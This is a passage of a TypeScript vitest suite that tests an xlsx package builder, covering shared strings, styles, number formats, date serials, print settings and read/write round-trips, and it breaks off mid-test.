import { describe, expect, it } from "vitest";
import type {
  ContentDefinedName,
  ContentDocument,
  ContentEmbeddedObject,
  ContentSheet,
  DefinitionsTable,
} from "document-schema.js";
import { PAGE_SIZE_A4, PAGE_SIZE_LETTER } from "document-schema.js";
import type { XmlElement } from "../../model/node";
import type { Package } from "../../model/package";
import { encodePackage } from "../../codec";
import { parsePackage } from "../../package-io/read";
import {
  attr,
  childrenWithTag,
  decodeEntities,
  rootElement,
  textContent,
} from "../util";
import { buildXlsxPackageFromContent } from "./build";
import { readXlsxContent } from "./content";
import { readWorkbookDefinitions } from "./definitions";
import { columnWidthCharsToPt } from "./units";
import { BUILTIN_NUMBER_FORMATS } from "excel-number-format";

// buildXlsxPackageFromContent's own real-LibreOffice validation (`soffice --headless --convert-to ods` against a genuine built .xlsx, confirming Excel/LibreOffice actually open the file rather than merely well-formed XML) is a manual verification step, deliberately NOT wired into this vitest suite -- this package's CI runners have no LibreOffice installed (unlike documents.js's own gitignored, opt-in test:corpus project, which exists for exactly this reason: real-third-party-software checks that need a local tool this repo's CI can't assume). This suite instead verifies everything checkable in-process: the produced Package's own XML structure (parsed back through this package's own lossless parsePackage/encodePackage, never assumed), and that readXlsxContent(buildXlsxPackageFromContent(x)) round-trips the real content.

const KITCHEN_SINK_SHEET: ContentSheet = {
  name: "Data",
  cells: [
    {
      row: 0,
      column: 0,
      value: { kind: "string", value: "Name" },
      displayText: "Name",
    },
    {
      row: 0,
      column: 1,
      value: { kind: "string", value: "Amount" },
      displayText: "Amount",
    },
    {
      row: 1,
      column: 0,
      value: { kind: "string", value: "Acme Corp" },
      displayText: "Acme Corp",
    },
    {
      row: 1,
      column: 1,
      value: { kind: "number", value: 1234.56 },
      displayText: "1234.56",
    },
    {
      row: 2,
      column: 0,
      value: { kind: "boolean", value: true },
      displayText: "TRUE",
    },
    {
      row: 3,
      column: 0,
      value: { kind: "number", value: 3 },
      formula: "SUM(B2:B3)",
      displayText: "3",
    },
    {
      row: 4,
      column: 0,
      value: { kind: "error", value: "#DIV/0!" },
      formula: "1/0",
      displayText: "#DIV/0!",
    },
    // A repeated text value -- exercises shared-string deduplication (both cells must intern to the SAME index).
    {
      row: 5,
      column: 0,
      value: { kind: "string", value: "Acme Corp" },
      displayText: "Acme Corp",
    },
    // The anchor of a 2x2 merge.
    {
      row: 6,
      column: 0,
      value: { kind: "string", value: "Merged Cell" },
      displayText: "Merged Cell",
      colSpan: 2,
      rowSpan: 2,
    },
    // A cell containing text that needs XML escaping.
    {
      row: 8,
      column: 0,
      value: { kind: "string", value: "Tom & Jerry <b>" },
      displayText: "Tom & Jerry <b>",
    },
  ],
  columns: [
    { index: 0, widthPt: 100 },
    { index: 1, widthPt: 60, hidden: true },
  ],
  rows: [
    { index: 0, heightPt: 20 },
    { index: 9, heightPt: 15, hidden: true },
  ],
  images: [],
  printSettings: {
    pageSize: PAGE_SIZE_A4,
    margins: { topPt: 54, rightPt: 50.4, bottomPt: 54, leftPt: 50.4 },
    printRange: { startRow: 0, startColumn: 0, endRow: 9, endColumn: 1 },
    scalePercent: 125,
    repeatRows: { start: 0, end: 0 },
    repeatColumns: { start: 0, end: 0 },
    gridlines: true,
    headers: true,
    pageOrder: "overThenDown",
    manualBreaks: { rows: [5], columns: [1] },
  },
};

const SUMMARY_SHEET: ContentSheet = {
  name: "Summary",
  cells: [
    {
      row: 0,
      column: 0,
      value: { kind: "number", value: 42 },
      displayText: "42",
    },
  ],
  columns: [],
  rows: [],
  images: [],
  printSettings: {
    pageSize: PAGE_SIZE_LETTER,
    margins: { topPt: 72, rightPt: 72, bottomPt: 72, leftPt: 72 },
    fitToPages: { width: 1, height: 3 },
    gridlines: false,
    headers: false,
    pageOrder: "downThenOver",
  },
};

const DOCUMENT: ContentDocument = {
  kind: "spreadsheet",
  metadata: {
    title: "Kitchen Sink",
    author: "Test Suite",
    keywords: ["a", "b"],
    createdIso: "2026-07-31T00:00:00Z",
  },
  sheets: [KITCHEN_SINK_SHEET, SUMMARY_SHEET],
};

describe("buildXlsxPackageFromContent: rejects a non-spreadsheet ContentDocument", () => {
  it("throws for a wordprocessing document", () => {
    const wrongKind: ContentDocument = {
      kind: "wordprocessing",
      metadata: {},
      sections: [],
    };
    expect(() => buildXlsxPackageFromContent(wrongKind)).toThrow(/spreadsheet/);
  });
});

describe("buildXlsxPackageFromContent: produces a structurally valid xlsx package", () => {
  const pkg = buildXlsxPackageFromContent(DOCUMENT);

  it("writes every required OPC/SpreadsheetML part", () => {
    expect(Object.keys(pkg.parts).sort()).toEqual(
      [
        "[Content_Types].xml",
        "_rels/.rels",
        "docProps/app.xml",
        "docProps/core.xml",
        "xl/_rels/workbook.xml.rels",
        "xl/sharedStrings.xml",
        "xl/styles.xml",
        "xl/workbook.xml",
        "xl/worksheets/sheet1.xml",
        "xl/worksheets/sheet2.xml",
      ].sort(),
    );
  });

  it("round-trips through the lossless byte codec (encodePackage -> parsePackage -> byte-identical structure)", () => {
    const bytes = encodePackage(pkg);
    const reparsed = parsePackage(bytes);
    expect(reparsed).toEqual(pkg);
  });

  it("deduplicates a repeated string value into a single shared-string entry", () => {
    const sharedStrings = rootElement(pkg.parts["xl/sharedStrings.xml"]);
    if (sharedStrings === undefined) {
      throw new Error("expected xl/sharedStrings.xml to have a root element");
    }
    const siCount = sharedStrings.children.filter(
      (node) => node.type === "element" && node.tag === "si",
    ).length;
    // "Name", "Amount", "Acme Corp" (deduplicated across rows 1 and 5), "Merged Cell", "Tom & Jerry <b>" -- 5 unique strings, not 6.
    expect(siCount).toBe(5);
  });

  it("writes a structurally complete xl/styles.xml in CT_Stylesheet element order, numFmts first", () => {
    const styles = rootElement(pkg.parts["xl/styles.xml"]);
    if (styles === undefined) {
      throw new Error("expected xl/styles.xml to have a root element");
    }
    const tags = styles.children
      .filter((node) => node.type === "element")
      .map((node) => node.tag);
    // numFmts is present because this sheet has a boolean cell, whose TRUE/FALSE display format is a custom one -- see the number-format suite below for the no-custom-formats case.
    expect(tags).toEqual([
      "numFmts",
      "fonts",
      "fills",
      "borders",
      "cellStyleXfs",
      "cellXfs",
      "cellStyles",
    ]);
  });
});

describe("readXlsxContent(buildXlsxPackageFromContent(x)) round-trips real content", () => {
  const pkg = buildXlsxPackageFromContent(DOCUMENT);
  const roundTripped = readXlsxContent(pkg);
  if (roundTripped.kind !== "spreadsheet") {
    throw new Error("expected a spreadsheet ContentDocument");
  }
  const [data, summary] = roundTripped.sheets;
  if (data === undefined || summary === undefined) {
    throw new Error("expected both sheets to survive the round trip");
  }

  it("preserves sheet names and order", () => {
    expect(roundTripped.sheets.map((sheet) => sheet.name)).toEqual([
      "Data",
      "Summary",
    ]);
  });

  it("preserves every cell value kind, including the deduplicated shared string and the XML-special-character text", () => {
    expect(
      data.cells.find((cell) => cell.row === 0 && cell.column === 0)?.value,
    ).toEqual({ kind: "string", value: "Name" });
    expect(
      data.cells.find((cell) => cell.row === 1 && cell.column === 1)?.value,
    ).toEqual({ kind: "number", value: 1234.56 });
    expect(
      data.cells.find((cell) => cell.row === 2 && cell.column === 0)?.value,
    ).toEqual({ kind: "boolean", value: true });
    expect(
      data.cells.find((cell) => cell.row === 4 && cell.column === 0)?.value,
    ).toEqual({ kind: "error", value: "#DIV/0!" });
    expect(
      data.cells.find((cell) => cell.row === 5 && cell.column === 0)?.value,
    ).toEqual({ kind: "string", value: "Acme Corp" });
    expect(
      data.cells.find((cell) => cell.row === 8 && cell.column === 0)?.value,
    ).toEqual({ kind: "string", value: "Tom & Jerry <b>" });
  });

  it("preserves formulas", () => {
    expect(
      data.cells.find((cell) => cell.row === 3 && cell.column === 0)?.formula,
    ).toBe("SUM(B2:B3)");
    expect(
      data.cells.find((cell) => cell.row === 4 && cell.column === 0)?.formula,
    ).toBe("1/0");
  });

  it("preserves the merged range as colSpan/rowSpan on the anchor cell", () => {
    const anchor = data.cells.find(
      (cell) => cell.row === 6 && cell.column === 0,
    );
    expect(anchor).toMatchObject({ colSpan: 2, rowSpan: 2 });
  });

  it("preserves column widths (within the documented approximation) and hidden flags", () => {
    const hiddenColumn = data.columns.find((column) => column.index === 1);
    expect(hiddenColumn?.hidden).toBe(true);
    const firstColumn = data.columns.find((column) => column.index === 0);
    expect(firstColumn?.widthPt).toBeGreaterThan(80); // approximate, not exact -- see units.ts's own documented round-trip caveat
    expect(firstColumn?.widthPt).toBeLessThan(120);
  });

  it("column widths converge to a fixed point rather than drifting on repeated read/write cycles (ExaDev/documents.js#953)", () => {
    // A dedicated document, not DOCUMENT above: DOCUMENT's own column widths (100pt/60pt) already reproduce write 2 byte-identically from write 2 onward even under the pre-fix rounding, so they would pass this assertion whether or not the fix is present and exercise nothing. These two widthPt values instead come from columnWidthCharsToPt(12.76) and columnWidthCharsToPt(9.7) -- points equivalents of two of kitchen-sink.xlsx's own real, LibreOffice-authored stored widths (see content.test.ts's dataSheetColWidthAttrs suite) -- independently re-verified to keep narrowing across multiple further write cycles under the pre-fix rounding (12.76 chars -> 12.64 -> 12.5 -> 12.36; 9.7 chars -> 9.64 -> 9.5 -> 9.36) rather than settling after the first.
    const drifting: ContentDocument = {
      kind: "spreadsheet",
      metadata: {},
      sheets: [
        {
          name: "Data",
          cells: [],
          columns: [
            { index: 0, widthPt: columnWidthCharsToPt(12.76) },
            { index: 1, widthPt: columnWidthCharsToPt(9.7) },
          ],
          rows: [],
          images: [],
          printSettings: {
            pageSize: PAGE_SIZE_A4,
            margins: { topPt: 72, rightPt: 72, bottomPt: 72, leftPt: 72 },
            gridlines: true,
            headers: true,
            pageOrder: "downThenOver",
          },
        },
      ],
    };

    function colWidthAttrs(
      source: Package,
      path: string,
    ): (string | undefined)[] {
      const worksheet = rootElement(source.parts[path]);
      if (worksheet === undefined) {
        throw new Error(`expected ${path} to have a root element`);
      }
      const colsEl = childrenWithTag(worksheet, "cols")[0];
      if (colsEl === undefined) {
        return [];
      }
      return childrenWithTag(colsEl, "col").map((col) => attr(col, "width"));
    }

    const firstWritePkg = buildXlsxPackageFromContent(drifting); // write 1 -- allowed to differ from write 2, since these widthPt values need not already land on the pixel grid the very first write snaps to
    const firstRead = readXlsxContent(firstWritePkg);
    if (firstRead.kind !== "spreadsheet") {
      throw new Error("expected a spreadsheet ContentDocument");
    }

    const secondWritePkg = buildXlsxPackageFromContent(firstRead); // write 2
    const secondRead = readXlsxContent(secondWritePkg);
    if (secondRead.kind !== "spreadsheet") {
      throw new Error("expected a spreadsheet ContentDocument");
    }
    const [secondData] = secondRead.sheets;
    if (secondData === undefined) {
      throw new Error("expected the first sheet to survive the second cycle");
    }

    const thirdWritePkg = buildXlsxPackageFromContent(secondRead); // write 3
    const thirdRead = readXlsxContent(thirdWritePkg);
    if (thirdRead.kind !== "spreadsheet") {
      throw new Error("expected a spreadsheet ContentDocument");
    }
    const [thirdData] = thirdRead.sheets;
    if (thirdData === undefined) {
      throw new Error("expected the first sheet to survive the third cycle");
    }

    expect(colWidthAttrs(thirdWritePkg, "xl/worksheets/sheet1.xml")).toEqual(
      colWidthAttrs(secondWritePkg, "xl/worksheets/sheet1.xml"),
    );
    expect(thirdData.columns).toEqual(secondData.columns);
  });

  it("preserves row heights and hidden flags", () => {
    expect(data.rows.find((row) => row.index === 0)?.heightPt).toBe(20);
    const hiddenRow = data.rows.find((row) => row.index === 9);
    expect(hiddenRow?.hidden).toBe(true);
    expect(hiddenRow?.heightPt).toBe(15);
  });

  it("preserves print settings: page size, scale, gridlines/headers, page order, print range, repeat rows/columns, manual breaks", () => {
    expect(data.printSettings.pageSize).toEqual(PAGE_SIZE_A4);
    expect(data.printSettings.scalePercent).toBe(125);
    expect(data.printSettings.fitToPages).toBeUndefined();
    expect(data.printSettings.gridlines).toBe(true);
    expect(data.printSettings.headers).toBe(true);
    expect(data.printSettings.pageOrder).toBe("overThenDown");
    expect(data.printSettings.printRange).toEqual({
      startRow: 0,
      startColumn: 0,
      endRow: 9,
      endColumn: 1,
    });
    expect(data.printSettings.repeatRows).toEqual({ start: 0, end: 0 });
    expect(data.printSettings.repeatColumns).toEqual({ start: 0, end: 0 });
    expect(data.printSettings.manualBreaks).toEqual({
      rows: [5],
      columns: [1],
    });
  });

  it("preserves the Summary sheet's fit-to-page settings and Letter page size", () => {
    expect(summary.printSettings.pageSize).toEqual(PAGE_SIZE_LETTER);
    expect(summary.printSettings.fitToPages).toEqual({ width: 1, height: 3 });
    expect(summary.printSettings.scalePercent).toBeUndefined();
    expect(
      summary.cells.find((cell) => cell.row === 0 && cell.column === 0)?.value,
    ).toEqual({ kind: "number", value: 42 });
  });

  it("preserves document metadata", () => {
    expect(roundTripped.metadata.title).toBe("Kitchen Sink");
    expect(roundTripped.metadata.author).toBe("Test Suite");
    expect(roundTripped.metadata.keywords).toEqual(["a", "b"]);
  });
});

describe("buildXlsxPackageFromContent: an empty sheet with no cells/columns/rows still produces a structurally valid worksheet", () => {
  const emptyDocument: ContentDocument = {
    kind: "spreadsheet",
    metadata: {},
    sheets: [
      {
        name: "Empty",
        cells: [],
        columns: [],
        rows: [],
        images: [],
        printSettings: {
          pageSize: PAGE_SIZE_LETTER,
          margins: { topPt: 72, rightPt: 72, bottomPt: 72, leftPt: 72 },
          gridlines: false,
          headers: false,
          pageOrder: "downThenOver",
        },
      },
    ],
  };

  it('builds and round-trips without throwing, dimension falling back to "A1"', () => {
    const pkg = buildXlsxPackageFromContent(emptyDocument);
    const worksheet = rootElement(pkg.parts["xl/worksheets/sheet1.xml"]);
    if (worksheet === undefined) {
      throw new Error("expected a worksheet root element");
    }
    const dimension = worksheet.children.find(
      (node) => node.type === "element" && node.tag === "dimension",
    );
    expect(
      dimension?.type === "element"
        ? dimension.attributes.find((a) => a.name === "ref")?.value
        : undefined,
    ).toBe("A1");

    const roundTripped = readXlsxContent(pkg);
    if (roundTripped.kind !== "spreadsheet") {
      throw new Error("expected a spreadsheet ContentDocument");
    }
    expect(roundTripped.sheets[0]?.cells).toEqual([]);
  });
});

// --- number formats: the write side of typed/xlsx/number-format.ts ------------------------------------------------

const DEFAULT_PRINT_SETTINGS: ContentSheet["printSettings"] = {
  pageSize: PAGE_SIZE_LETTER,
  margins: { topPt: 72, rightPt: 72, bottomPt: 72, leftPt: 72 },
  gridlines: false,
  headers: false,
  pageOrder: "downThenOver",
};

function singleSheetDocument(cells: ContentSheet["cells"]): ContentDocument {
  return {
    kind: "spreadsheet",
    metadata: {},
    sheets: [
      {
        name: "Sheet1",
        cells,
        columns: [],
        rows: [],
        images: [],
        printSettings: DEFAULT_PRINT_SETTINGS,
      },
    ],
  };
}

function elementsOf(parent: XmlElement, tag: string): XmlElement[] {
  return parent.children.filter(
    (node): node is XmlElement => node.type === "element" && node.tag === tag,
  );
}

function childElement(parent: XmlElement, tag: string): XmlElement | undefined {
  return elementsOf(parent, tag)[0];
}

function requireChild(parent: XmlElement, tag: string): XmlElement {
  const child = childElement(parent, tag);
  if (child === undefined) {
    throw new Error(`expected a <${tag}> child of <${parent.tag}>`);
  }
  return child;
}

function attributeOf(element: XmlElement, name: string): string | undefined {
  return element.attributes.find((attribute) => attribute.name === name)?.value;
}

function styleSheetOf(pkg: Package): XmlElement {
  const styles = rootElement(pkg.parts["xl/styles.xml"]);
  if (styles === undefined) {
    throw new Error("expected xl/styles.xml to have a root element");
  }
  return styles;
}

// Every written cell of the first worksheet, keyed by its own A1 reference.
function writtenCells(pkg: Package): Map<string, XmlElement> {
  const worksheet = rootElement(pkg.parts["xl/worksheets/sheet1.xml"]);
  if (worksheet === undefined) {
    throw new Error("expected a worksheet root element");
  }
  const sheetData = requireChild(worksheet, "sheetData");
  const cells = new Map<string, XmlElement>();
  for (const row of elementsOf(sheetData, "row")) {
    for (const cell of elementsOf(row, "c")) {
      const reference = attributeOf(cell, "r");
      if (reference !== undefined) {
        cells.set(reference, cell);
      }
    }
  }
  return cells;
}

function writtenCell(pkg: Package, reference: string): XmlElement {
  const cell = writtenCells(pkg).get(reference);
  if (cell === undefined) {
    throw new Error(`expected a written cell at ${reference}`);
  }
  return cell;
}

// The <v> text of a written cell, exactly as a consumer would read it.
function writtenValue(pkg: Package, reference: string): string {
  return requireChild(writtenCell(pkg, reference), "v")
    .children.map((node) => (node.type === "text" ? node.value : ""))
    .join("");
}

// The number format a written cell is displayed through: its own s index resolved through <cellXfs> and, for a custom id, through <numFmts>. Deliberately resolved from the produced XML rather than from the table that produced it, so these assertions check what a consumer actually reads.
function formatCodeOf(pkg: Package, reference: string): string | undefined {
  const styleIndex = Number(attributeOf(writtenCell(pkg, reference), "s"));
  const styles = styleSheetOf(pkg);
  const cellXfs = requireChild(styles, "cellXfs");
  const xf = elementsOf(cellXfs, "xf")[styleIndex];
  if (xf === undefined) {
    throw new Error(`expected a cellXfs entry at index ${styleIndex}`);
  }
  const numFmtId = attributeOf(xf, "numFmtId");
  const numFmts = childElement(styles, "numFmts");
  const declared = numFmts === undefined ? [] : elementsOf(numFmts, "numFmt");
  const match = declared.find(
    (numFmt) => attributeOf(numFmt, "numFmtId") === numFmtId,
  );
  return match === undefined
    ? BUILTIN_NUMBER_FORMATS.get(Number(numFmtId))
    : decodeEntities(attributeOf(match, "formatCode") ?? "");
}

describe("buildXlsxPackageFromContent: writes a real number format for every value kind xlsx has no cell type for", () => {
  const pkg = buildXlsxPackageFromContent(
    singleSheetDocument([
      {
        row: 0,
        column: 0,
        value: { kind: "percentage", value: 0.4256 },
        displayText: "0.4256",
      },
      {
        row: 0,
        column: 1,
        value: { kind: "currency", value: 99.99, currency: "GBP" },
        displayText: "99.99",
      },
      {
        row: 0,
        column: 2,
        value: { kind: "currency", value: 12.5 },
        displayText: "12.5",
      },
      {
        row: 0,
        column: 3,
        value: { kind: "date", value: "2026-07-31" },
        displayText: "2026-07-31",
      },
      {
        row: 0,
        column: 4,
        value: { kind: "time", value: "14:30:00" },
        displayText: "14:30:00",
      },
      {
        row: 0,
        column: 5,
        value: { kind: "dateTime", value: "2026-07-31T14:30:00" },
        displayText: "2026-07-31T14:30:00",
      },
      {
        row: 0,
        column: 6,
        value: { kind: "boolean", value: true },
        displayText: "TRUE",
      },
      // A second boolean, to prove one format is interned rather than one per cell.
      {
        row: 0,
        column: 7,
        value: { kind: "boolean", value: false },
        displayText: "FALSE",
      },
      {
        row: 0,
        column: 8,
        value: { kind: "number", value: 42 },
        displayText: "42",
      },
    ]),
  );

  it("writes the built-in percentage and time formats by id, declaring no <numFmt> for either", () => {
    expect(formatCodeOf(pkg, "A1")).toBe("0.00%");
    expect(formatCodeOf(pkg, "E1")).toBe("h:mm:ss");
  });

  it("writes a currency's ISO code into the format itself, so it survives the way a bare symbol would not", () => {
    expect(formatCodeOf(pkg, "B1")).toBe("[$GBP]#,##0.00");
  });

  it("writes a currency with no ISO code as a plain amount format -- a documented, deliberate loss of the money semantic", () => {
    expect(formatCodeOf(pkg, "C1")).toBe("#,##0.00");
  });

  it("writes ISO-ordered date and dateTime formats", () => {
    expect(formatCodeOf(pkg, "D1")).toBe("yyyy\\-mm\\-dd");
    expect(formatCodeOf(pkg, "F1")).toBe("yyyy\\-mm\\-dd hh:mm:ss");
  });

  it("writes the LibreOffice TRUE/FALSE boolean format, XML-encoded in the attribute and decoding back to the exact quoted-section code", () => {
    expect(formatCodeOf(pkg, "G1")).toBe('"TRUE";"TRUE";"FALSE"');
    const declared = elementsOf(
      requireChild(styleSheetOf(pkg), "numFmts"),
      "numFmt",
    ).map((numFmt) => attributeOf(numFmt, "formatCode"));
    expect(declared).toContain(
      "&quot;TRUE&quot;;&quot;TRUE&quot;;&quot;FALSE&quot;",
    );
  });

  it("interns one cell format per distinct number format, not one per cell, and leaves an unformatted cell at index 0", () => {
    expect(attributeOf(writtenCell(pkg, "G1"), "s")).toBe(
      attributeOf(writtenCell(pkg, "H1"), "s"),
    );
    expect(attributeOf(writtenCell(pkg, "I1"), "s")).toBe("0");
    // Seven distinct non-General formats across nine cells (percentage, GBP currency, plain amount, date, time, dateTime, boolean), plus the General default at index 0.
    const cellXfs = requireChild(styleSheetOf(pkg), "cellXfs");
    expect(elementsOf(cellXfs, "xf").length).toBe(8);
    expect(attributeOf(cellXfs, "count")).toBe("8");
  });

  it("marks every non-General cell format applyNumberFormat, and never the General one", () => {
    const xfs = elementsOf(requireChild(styleSheetOf(pkg), "cellXfs"), "xf");
    expect(xfs.map((xf) => attributeOf(xf, "applyNumberFormat"))).toEqual([
      undefined,
      "true",
      "true",
      "true",
      "true",
      "true",
      "true",
      "true",
    ]);
  });

  it('writes a date/time/dateTime cell as a REAL SERIAL with no t attribute at all, never ST_CellType\'s t="d"', () => {
    for (const reference of ["D1", "E1", "F1"]) {
      expect(attributeOf(writtenCell(pkg, reference), "t")).toBeUndefined();
      expect(Number.isFinite(Number(writtenValue(pkg, reference)))).toBe(true);
    }
    // 46234 is the serial this package's own kitchen-sink fixture (a real LibreOffice export) stores for 2026-07-31; a time of day is the fraction-of-a-day part alone, and a dateTime the two summed.
    expect(writtenValue(pkg, "D1")).toBe("46234");
    expect(Number(writtenValue(pkg, "E1"))).toBeCloseTo(14.5 / 24, 12);
    expect(Number(writtenValue(pkg, "F1"))).toBeCloseTo(46234 + 14.5 / 24, 9);
  });

  it("round-trips every kind back through readXlsxContent, including the deliberate currency-without-a-code narrowing", () => {
    const roundTripped = readXlsxContent(pkg);
    if (roundTripped.kind !== "spreadsheet") {
      throw new Error("expected a spreadsheet ContentDocument");
    }
    const cells = roundTripped.sheets[0]?.cells ?? [];
    const valueAt = (column: number): unknown =>
      cells.find((cell) => cell.row === 0 && cell.column === column)?.value;
    expect(valueAt(0)).toEqual({ kind: "percentage", value: 0.4256 });
    expect(valueAt(1)).toEqual({
      kind: "currency",
      value: 99.99,
      currency: "GBP",
    });
    // The documented loss: nothing in '#,##0.00' says money, so a currency that named no ISO code comes back as the plain number it now looks like.
    expect(valueAt(2)).toEqual({ kind: "number", value: 12.5 });
    expect(valueAt(3)).toEqual({ kind: "date", value: "2026-07-31" });
    // The bug this write side exists to fix: a time cell no longer collapses into a date/dateTime, because its serial and format distinguish it.
    expect(valueAt(4)).toEqual({ kind: "time", value: "14:30:00" });
    expect(valueAt(5)).toEqual({
      kind: "dateTime",
      value: "2026-07-31T14:30:00",
    });
    expect(valueAt(6)).toEqual({ kind: "boolean", value: true });
    expect(valueAt(7)).toEqual({ kind: "boolean", value: false });
    expect(valueAt(8)).toEqual({ kind: "number", value: 42 });
  });
});

describe("buildXlsxPackageFromContent: a temporal value with no valid serial degrades to text, never to a fabricated serial", () => {
  const pkg = buildXlsxPackageFromContent(
    singleSheetDocument([
      // An ODF-style duration rather than the canonical HH:MM:SS wall-clock spelling.
      {
        row: 0,
        column: 0,
        value: { kind: "time", value: "PT14H30M00S" },
        displayText: "PT14H30M00S",
      },
      // A calendar day that does not exist, and a date before the 1900 epoch -- neither has a serial.
      {
        row: 0,
        column: 1,
        value: { kind: "date", value: "2026-02-30" },
        displayText: "2026-02-30",
      },
      {
        row: 0,
        column: 2,
        value: { kind: "date", value: "1850-01-01" },
        displayText: "1850-01-01",
      },
    ]),
  );

  it("writes each one as an ordinary shared-string cell carrying the original text verbatim", () => {
    for (const reference of ["A1", "B1", "C1"]) {
      expect(attributeOf(writtenCell(pkg, reference), "t")).toBe("s");
      expect(attributeOf(writtenCell(pkg, reference), "s")).toBe("0");
    }
    const roundTripped = readXlsxContent(pkg);
    if (roundTripped.kind !== "spreadsheet") {
      throw new Error("expected a spreadsheet ContentDocument");
    }
    expect(
      (roundTripped.sheets[0]?.cells ?? []).map((cell) => cell.value),
    ).toEqual([
      { kind: "string", value: "PT14H30M00S" },
      { kind: "string", value: "2026-02-30" },
      { kind: "string", value: "1850-01-01" },
    ]);
  });

  it("declares no number formats at all, since nothing needing one was written", () => {
    expect(childElement(styleSheetOf(pkg), "numFmts")).toBeUndefined();
  });
});

describe("buildXlsxPackageFromContent: a workbook needing no number formats writes the same minimal styles part it always did", () => {
  const pkg = buildXlsxPackageFromContent(
    singleSheetDocument([
      {
        row: 0,
        column: 0,
        value: { kind: "string", value: "Name" },
        displayText: "Name",
      },
      {
        row: 0,
        column: 1,
        value: { kind: "number", value: 1234.56 },
        displayText: "1234.56",
      },
      {
        row: 0,
        column: 2,
        value: { kind: "error", value: "#DIV/0!" },
        displayText: "#DIV/0!",
      },
    ]),
  );

  it("omits <numFmts> entirely and writes exactly one General cellXfs entry", () => {
    const styles = styleSheetOf(pkg);
    const tags = styles.children
      .filter((node) => node.type === "element")
      .map((node) => node.tag);
    expect(tags).toEqual([
      "fonts",
      "fills",
      "borders",
      "cellStyleXfs",
      "cellXfs",
      "cellStyles",
    ]);
    const cellXfs = requireChild(styles, "cellXfs");
    expect(attributeOf(cellXfs, "count")).toBe("1");
    expect(
      elementsOf(cellXfs, "xf").map((xf) => attributeOf(xf, "numFmtId")),
    ).toEqual(["0"]);
    expect(
      elementsOf(cellXfs, "xf").map((xf) =>
        attributeOf(xf, "applyNumberFormat"),
      ),
    ).toEqual([undefined]);
  });

  it("writes the exact fixed scaffolding: one default font, the two reserved fills, the one reserved border, and a single default cellStyleXfs/cellXfs/cellStyles entry, none of them apply*-flagged", () => {
    const styles = styleSheetOf(pkg);

    const fontsEl = requireChild(styles, "fonts");
    expect(attributeOf(fontsEl, "count")).toBe("1");
    const fonts = elementsOf(fontsEl, "font");
    expect(fonts).toHaveLength(1);
    const defaultFont = fonts[0];
    if (defaultFont === undefined) {
      throw new Error("expected a default <font>");
    }
    expect(attributeOf(requireChild(defaultFont, "sz"), "val")).toBe("11");
    expect(attributeOf(requireChild(defaultFont, "name"), "val")).toBe(
      "Calibri",
    );
    expect(elementsOf(defaultFont, "color")).toHaveLength(0);
    expect(elementsOf(defaultFont, "b")).toHaveLength(0);
    expect(elementsOf(defaultFont, "i")).toHaveLength(0);
    expect(elementsOf(defaultFont, "strike")).toHaveLength(0);
    expect(elementsOf(defaultFont, "u")).toHaveLength(0);

    const fillsEl = requireChild(styles, "fills");
    expect(attributeOf(fillsEl, "count")).toBe("2");
    const fills = elementsOf(fillsEl, "fill");
    expect(
      fills.map((fill) =>
        attributeOf(requireChild(fill, "patternFill"), "patternType"),
      ),
    ).toEqual(["none", "gray125"]);

    const bordersEl = requireChild(styles, "borders");
    expect(attributeOf(bordersEl, "count")).toBe("1");
    const borders = elementsOf(bordersEl, "border");
    expect(borders).toHaveLength(1);
    const reserved = borders[0];
    if (reserved === undefined) {
      throw new Error("expected the reserved <border>");
    }
    expect(reserved.tag).toBe("border");
    for (const edge of ["left", "right", "top", "bottom", "diagonal"]) {
      const edgeEl = requireChild(reserved, edge);
      expect(attributeOf(edgeEl, "style")).toBeUndefined();
      expect(elementsOf(edgeEl, "color")).toHaveLength(0);
    }

    const cellStyleXfsEl = requireChild(styles, "cellStyleXfs");
    expect(attributeOf(cellStyleXfsEl, "count")).toBe("1");
    const cellStyleXf = elementsOf(cellStyleXfsEl, "xf")[0];
    if (cellStyleXf === undefined) {
      throw new Error("expected a <xf> inside <cellStyleXfs>");
    }
    expect(attributeOf(cellStyleXf, "numFmtId")).toBe("0");
    expect(attributeOf(cellStyleXf, "fontId")).toBe("0");
    expect(attributeOf(cellStyleXf, "fillId")).toBe("0");
    expect(attributeOf(cellStyleXf, "borderId")).toBe("0");

    const cellXfs = requireChild(styles, "cellXfs");
    const xf = elementsOf(cellXfs, "xf")[0];
    if (xf === undefined) {
      throw new Error("expected the default <xf>");
    }
    expect(attributeOf(xf, "fontId")).toBe("0");
    expect(attributeOf(xf, "fillId")).toBe("0");
    expect(attributeOf(xf, "borderId")).toBe("0");
    expect(attributeOf(xf, "xfId")).toBe("0");
    for (const flag of [
      "applyFont",
      "applyFill",
      "applyBorder",
      "applyAlignment",
    ]) {
      expect(xf.attributes.map((a) => a.name)).not.toContain(flag);
    }

    const cellStylesEl = requireChild(styles, "cellStyles");
    expect(attributeOf(cellStylesEl, "count")).toBe("1");
    const cellStyle = elementsOf(cellStylesEl, "cellStyle")[0];
    if (cellStyle === undefined) {
      throw new Error("expected a <cellStyle>");
    }
    expect(attributeOf(cellStyle, "name")).toBe("Normal");
    expect(attributeOf(cellStyle, "xfId")).toBe("0");
    expect(attributeOf(cellStyle, "builtinId")).toBe("0");

    expect(childrenWithTag(styles, "dxfs")).toHaveLength(0);
    expect(styles.tag).toBe("styleSheet");
    expect(attr(styles, "xmlns")).toBe(
      "http://schemas.openxmlformats.org/spreadsheetml/2006/main",
    );
  });

  it("writes numFmts with the exact declared numFmtId/formatCode and count, for a document needing a custom format", () => {
    const withCustomFormat = buildXlsxPackageFromContent(
      singleSheetDocument([
        {
          row: 0,
          column: 0,
          value: { kind: "boolean", value: true },
          displayText: "TRUE",
        },
      ]),
    );
    const styles = styleSheetOf(withCustomFormat);
    const numFmts = requireChild(styles, "numFmts");
    expect(attributeOf(numFmts, "count")).toBe("1");
    const declared = elementsOf(numFmts, "numFmt");
    expect(declared).toHaveLength(1);
    expect(attributeOf(declared[0]!, "numFmtId")).toBe("164");
  });
});

describe("buildXlsxPackageFromContent: xl/styles.xml carries every font toggle, per-edge border mixing, and a one-sided pattern fill exactly", () => {
  const pkg = buildXlsxPackageFromContent(
    singleSheetDocument([
      // A font using EVERY toggle at once, to prove each one writes its own element independently of the others.
      {
        row: 0,
        column: 0,
        value: { kind: "string", value: "x" },
        displayText: "x",
        font: { bold: true, italic: true, strike: true, underline: true },
      },
      // A border carrying only its top edge, so left/right/bottom must fall back to the bare, style-less branch while top alone carries real data.
      {
        row: 1,
        column: 0,
        value: { kind: "string", value: "y" },
        displayText: "y",
        borders: { top: { color: { r: 0, g: 1, b: 0 }, widthPt: 1.5 } },
      },
